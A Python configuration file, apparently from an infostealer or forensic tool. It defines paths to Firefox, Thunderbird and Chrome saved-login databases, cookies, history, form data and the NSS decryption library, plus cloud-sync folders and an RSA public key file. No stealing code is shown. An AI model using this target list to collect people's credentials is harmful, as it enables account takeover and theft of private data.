import getpass, platform, os, sys

UNAME = getpass.getuser()
OP_SYS = platform.system()
WIN_APPDATA = "C:\\Users\\" + UNAME + "\\AppData\\"

if UNAME == "root":
	LINUX_HOME = "/root/"
else:
	LINUX_HOME = "/home/" + UNAME + "/"

START_PATH = os.path.dirname(os.path.abspath(sys.argv[0]))
PUB_KEY_RSA = os.path.join(START_PATH,"pubkey.pem")


# mozilla useful file
FF_PROFILE_WIN = WIN_APPDATA + "Roaming\Mozilla\Firefox"
FF_PROFILE_LINUX = LINUX_HOME + ".mozilla/firefox"
FF_COOKIES = "cookies.sqlite"
FORM_HISTORY = "formhistory.sqlite"
PLACES = "places.sqlite"
MOZ_LOGIN_FILE_DB = "signons.sqlite"
MOZ_LOGIN_FILE_JSON = "logins.json"
LIBNSS_WIN = "nss3.dll"
LIBNSS_LINUX = "libnss3.so"
TH_PROFILE_WIN = WIN_APPDATA + "Roaming\\Thunderbird"
TH_PROFILE_LINUX = LINUX_HOME + ".thunderbird"
LIBNSS = LIBNSS_LINUX if OP_SYS == "Linux" else LIBNSS_WIN
FF_COPY_FOLDER = "firefox-copy"
TH_COPY_FOLDER = "thunderbird-copy"

# chrome useful file
GCHROME_PROFILE_WIN = WIN_APPDATA + "Local\\Google\\Chrome\\User Data"
GCHROME_PROFILE_LINUX = LINUX_HOME + ".config/google-chrome"
GCHROME_LOGIN_FILE = "Login Data"
BOOKMARKS = "Bookmarks"
GCHROME_COOKIES = "Cookies"
HISTORY = "History"
WEB_DATA = "Web Data"
GCHROME_EXEC_LINUX = "google-chrome-stable"
GCHROME_COPY_FOLDER = "chrome-copy"

# Cloud 
DROPBOX_WIN = WIN_APPDATA + "Roaming\\Dropbox"
DROPBOX_LINUX = LINUX_HOME + ".dropbox"
GDRIVE = WIN_APPDATA + "Local\\Google\\Drive"
ONEDRIVE = WIN_APPDATA + "Local\\Microsoft\\SkyDrive"

# determine profile directory
GCHROME_PROFILE = GCHROME_PROFILE_LINUX if OP_SYS == "Linux" else GCHROME_PROFILE_WIN
FF_PROFILE = FF_PROFILE_LINUX if OP_SYS == "Linux" else FF_PROFILE_WIN
TH_PROFILE = TH_PROFILE_LINUX if OP_SYS == "Linux" else TH_PROFILE_WIN
DROPBOX = DROPBOX_LINUX if OP_SYS == "Linux" else DROPBOX_WIN
